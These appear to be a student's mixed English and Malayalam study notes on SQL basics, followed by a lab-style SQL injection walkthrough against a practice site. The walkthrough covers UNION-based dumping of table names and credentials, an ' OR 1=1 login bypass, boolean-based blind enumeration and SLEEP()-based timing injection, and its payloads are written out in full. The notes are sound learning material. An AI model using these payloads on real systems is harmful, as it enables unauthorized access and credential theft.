DBMS : data base management system(this controls the wholw database-baki audio keto)
relational database : it contains tables,columns,rows.each tables has unique id so that another table can refer it , hence called relational database eg:mysql,microsoft sql servel,postgresql...etc
non-relational database : also calles no-sql.it doesnt have tables.eg:mongodb,cassandra..etc

--------------------------------------
->select * from users;
        users enna table il ninum ella coloumns dumb chyth therum

--------------------------------------------
->select username,password from users;
            specific aayi oro coloumns um dumb chyan

----------------------------------------------
->select * from users LIMIT 1;
            limit chyan aayit
			
--------------------------------------
->select * from users where username='admin';
          exact data pick chyan where clause upayogikunu.shows rows that ewqual to admin 
		
----------------------------------------

->select * from users where username != 'admin';
          admin ozhich baki ellam kanikum
		  
-----------------------------------------
->select * from users where username='admin' or username='jon';
            This will only return the rows where the username is either equal to admin or jon

---------------------------------------------
->select * from users where username='admin' and password='p4ssword';
               This will only return the rows where the username is equal to admin, and the password is equal to p4ssword.

-----------------------------------------------
->select * from users where username like 'a%';
               This returns any rows with username beginning with the letter a.
			   
-------------------------------------------------
->select * from users where username like '%n';
               This returns any rows with username ending with the letter n
			   
----------------------------------------------------
->select * from users where username like '%mi%';
			   This returns any rows with a username containing the characters mi within them
			   
----------------------------------------------------
--------------------------------------------------
UNION
The UNION statement combines the results of two or more SELECT statements to retrieve data from either single or multiple tables; the rules to this query are that the UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type and the column order has to be the same

->SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;
                  ivide rand tables undayirunu.randinum same column names aan.so union vech retreive chythu
				  
-------------------------------------------------------
--------------------------------------------------------
INSERT
The INSERT statement tells the database we wish to insert a new row of data into the table. "into users" tells the database which table we wish to insert the data into, "(username,password)" provides the columns we are providing data for and then "values ('bob','password');" provides the data for the previously specified columns.

->insert into users (username,password) values ('bob','password123');
                 ee puthiya username,passwordum insert chyum
				 
---------------------------------------------------------
---------------------------------------------------------
UPDATE
The UPDATE statement tells the database we wish to update one or more rows of data within a table

->update users SET username='root',password='pass123' where username='admin';
                    
--------------------------------------------------------
--------------------------------------------------------
DELETE
The DELETE statement tells the database we wish to delete one or more rows of data
->delete from users where username='martin';
->delete from users; (this will delete everything bqz we didnt specify with WHERE)

---------------------------------------------------------
----------------------------------------------------------

                                                      SQL INJECTION

->https://website.thm/blog?id=1   - ith oru website search aayi kanuka
->SELECT * from blog where id=1 and private=0 LIMIT 1;  - ivide id yil ninuman query chyunath.so query chyunathan ipo kanunath.
	
--------------------------------------------------------------------
->https://website.thm/blog?id=2;-- 
                  Which would then, in turn, produce the SQL statement:
				  ->SELECT * from blog where id=2;-- and private=0 LIMIT 1;
The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment. By doing this, you're just, in fact, running the query:
                     ->SELECT * from blog where id=2;--	
					 Which will return the article with an id of 2 whether it is set to public or not
					 
----------------------------------------------------------------------------------------------------------------------------------------

                                                          In-Band SQLi
	
			where we can see the results of our attack directly on the screen											  
->https://website.thm/article?id=1' = Try typing an apostrophe ( ' ) after the id=1 and press enter. And you'll see this returns an SQL error informing you of an error in your syntax. The fact that you've received this error message confirms the existence of an SQL Injection vulnerability

Firstly we'll try the UNION operator so we can receive an extra result of our choosing. Try setting the mock browsers id parameter to:
     ->1 UNION SELECT 1              (ie https://website.thm/article?id=1 UNION SELECT 1)
This statement should produce an error message informing you that the UNION SELECT statement has a different number of columns than the original SELECT query. So let's try again but add another column:
       ->1 UNION SELECT 1,2             (this show error)
	   ->1 UNION SELECT 1,2,3          (success)(ie https://.....?id=1 UNION SELECT 1,2,3)
	   the error message has gone, and the article is being displayed, but now we want to display our data instead of the article. The article is being displayed because it takes the first returned result somewhere in the web site's code and shows that. To get around that, we need the first query to produce no results. This can simply be done by changing the article id from 1 to 0.
                 ->0 UNION SELECT 1,2,3            (ie https://.....?id=0 UNION SELECT 1,2,3 )
 First, we'll get the database name that we have access to:
                 ->0 UNION SELECT 1,2,database()
Our next query will gather a list of tables that are in this database:
                  ->0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
                  ->0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
				  ->0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users                 (now we will get usename,passwords)
				  
				  results = admin:p4ssword
				                     martin:pa$$word
									 jim:work123
									
----------------------------------------------------------------------------------------------------------------------------------------

                                                       Blind SQLi
													   
	Blind SQLi is when we get little to no feedback to confirm whether our injected queries were, in fact, successful or not, this is because the error messages have been disabled, but the injection still works regardless.
	
Authentication Bypass-
One of the most straightforward Blind SQL Injection techniques is when bypassing authentication methods such as login forms. In this instance, we aren't that interested in retrieving data from the database; We just want to get past the login. 
    web app in username,password ile contents il thalparyam illa.web appin angane oru sambavam database il undo enn mathrame ariyandu.so database yes/no reply tharum
we can use ->' OR 1=1;--    to make query that always returns as true
     Which turns the SQL query into the following:
	        ->select * from users where username='' and password='' OR 1=1;
		
----------------------------------------------------------------------------------------------------------------------------------------

                                             Blind SQLi - Boolean Based 
											 
Boolean based SQL Injection refers to the response we receive back from our injection attempts which could be a true/false, yes/no, on/off, 1/0 or any response which can only ever have two outcomes.
->https://website.thm/checkuser?username=admin ithan site.ivide =shesham oron itt nammal sqli chyanam
->admin123' UNION SELECT 1;--   (ie ....ser?username=admin123' UNION SELECT 1;--)
As the web application has responded with the value taken as false, we can confirm this is the incorrect value of columns. Keep on adding more columns until we have a taken value of true. You can confirm that the answer is three columns by setting the username to the below value:
->admin123' UNION SELECT 1,2,3;--   (athayath true kanunathvere chyanam)
Our next task is discovering the database name. We can do this by using the built-in database() method and then using the like operator to try and find results that will return a true status:
->admin123' UNION SELECT 1,2,3 where database() like '%';--
We get a true response because, in the like operator, we just have the value of %, which will match anything as it's the wildcard value. If we change the wildcard operator to a%, you'll see the response goes back to false, which confirms that the database name does not begin with the letter a. We can cycle through all the letters, numbers and characters such as - and _ until we discover a match. If you send the below as the username value, you'll receive a true response that confirms the database name begins with the letter s:
->admin123' UNION SELECT 1,2,3 where database() like 's%';--
Now you move onto the next character of the database name until you find another true response, for example, 'sa%', 'sb%', 'sc%' etc. Keep on with this process until you discover all the characters of the database name, which is sqli_three.
We've established the database name, which we can now use to enumerate table names using a similar method by utilising the information_schema database. Try setting the username to the following value:
->admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--

This query looks for results in the information_schema database in the tables table where the database name matches sqli_three, and the table name begins with the letter a. As the above query results in a false response, we can confirm that there are no tables in the sqli_three database that begin with the letter a. Like previously, you'll need to cycle through letters, numbers and characters until you find a positive match.
  You'll finally end up discovering a table in the sqli_three database named users, which you can be confirmed by running the following username payload:
->admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
Lastly, we now need to enumerate the column names in the users table so we can properly search it for login credentials:
->admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
Again you'll need to cycle through letters, numbers and characters until you find a match.
->admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
Repeating this process three times will enable you to discover the columns id, username and password. Which now you can use to query the users table for login credentials. First, you'll need to discover a valid username which you can use the payload below:
->admin123' UNION SELECT 1,2,3 from users where username like 'a%
Which, once you've cycled through all the characters, you will confirm the existence of the username admin. Now you've got the username. You can concentrate on discovering the password. The payload below shows you how to find the password:
->admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%

----------------------------------------------------------------------------------------------------------------------------------------
 
                                              Blind SQLi - Time Based
											  

A time-based blind SQL Injection is very similar to the above Boolean based, in that the same requests are sent, but there is no visual indicator of your queries being wrong or right this time. Instead, your indicator of a correct query is based on the time the query takes to complete. This time delay is introduced by using built-in methods such as SLEEP(x) alongside the UNION statement. The SLEEP() method will only ever get executed upon a successful UNION SELECT statement. 

So, for example, when trying to establish the number of columns in a table, you would use the following query:
         ->admin123' UNION SELECT SLEEP(5);--
If there was no pause in the response time, we know that the query was unsuccessful, so like on previous tasks, we add another column:
           ->admin123' UNION SELECT SLEEP(5),2;--
This payload should have produced a 5-second time delay, which confirms the successful execution of the UNION statement and that there are two columns.

You can now repeat the enumeration process from the Boolean based SQL Injection, adding the SLEEP() method into the UNION SELECT statement.








